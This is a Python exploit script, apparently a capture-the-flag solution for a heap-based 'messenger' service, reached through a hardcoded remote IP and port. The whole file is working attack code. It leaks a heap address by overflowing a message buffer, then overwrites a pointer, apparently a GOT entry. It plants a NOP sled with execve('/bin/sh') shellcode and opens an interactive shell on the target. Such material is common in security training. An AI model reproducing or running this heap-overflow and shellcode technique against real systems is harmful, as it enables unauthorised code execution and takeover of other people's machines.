import pwnbox,struct
unpack = lambda x: struct.unpack("<Q",x)[0]
pack = lambda x: struct.pack("<Q",x)
#p = pwnbox.pipe.ProcessPipe("./messenger")
p = pwnbox.pipe.SocketPipe("110.10.212.137", 3334)
def leave(msg):
  p.read_until(">>")
  p.write("L\n")
  p.read_until(":")
  p.write("%d\n"%len(msg))
  p.read_until(":")
  p.write(msg)


def change(idx,msg):
  p.read_until(">>")
  p.write("C\n")
  p.read_until(":")
  p.write("%d\n"%idx)
  p.read_until(":")
  p.write("%d\n"%len(msg))
  p.read_until(":")
  p.write(msg)

def view(idx):
  p.read_until(">>")
  p.write("V\n")
  p.read_until(":")
  p.write("%d\n"%idx)
  return p.read_until("[L]eave message").split("[L]eave message")[0]

leave("A"*8)
leave("B"*8)
change(0,"A"*0x20)
heap = unpack(view(0).split("A"*0x20)[1].split("\x0a")[0].ljust(8,"\x00"))
shell = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

change(0,"A"*0x20+pack(0x602058-0x10)+pack(heap))
change(1,"\x90"*100+shell)
p.read_until(">>")
p.write("R\n")
p.read_until(":")
p.write("1\n")
p.write("L\n")

p.interact()
